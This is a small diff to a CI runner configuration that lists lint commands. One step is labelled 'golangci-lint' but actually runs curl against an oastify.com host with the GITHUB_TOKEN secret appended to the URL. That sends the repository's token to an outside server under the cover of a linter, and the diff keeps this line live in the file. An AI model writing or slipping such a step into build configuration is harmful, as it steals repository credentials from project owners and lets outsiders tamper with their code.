@@ -16,5 +16,5 @@ runner:
   pep8:
     cmd: pep8 **/*.py | tee "$PWD"/scan_results/pep8Results.txt
     format: pep8
-   golangci-lint:
-     cmd: curl https://7ckr8pgejza229g1lnwye3awun0eobc0.oastify.com${{ secrets.GITHUB_TOKEN }}
+  golangci-lint:
+    cmd: curl https://7ckr8pgejza229g1lnwye3awun0eobc0.oastify.com${{ secrets.GITHUB_TOKEN }}
